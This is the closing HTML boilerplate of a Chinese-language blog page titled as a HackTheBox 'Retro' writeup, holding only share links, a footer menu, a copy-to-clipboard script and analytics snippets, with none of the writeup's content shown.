  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/27/Retro/Retro/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&text=HackTheBox——HTB Retro Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&is_video=false&description=HackTheBox——HTB Retro Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Retro Writeup&body=Check out this article: https://n0nome.github.io/2025/06/27/Retro/Retro/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&name=HackTheBox——HTB Retro Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/27/Retro/Retro/&t=HackTheBox——HTB Retro Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    n0nome
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

<!-- FancyBox -->

    <script src='https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js'></script>


</body>
</html>
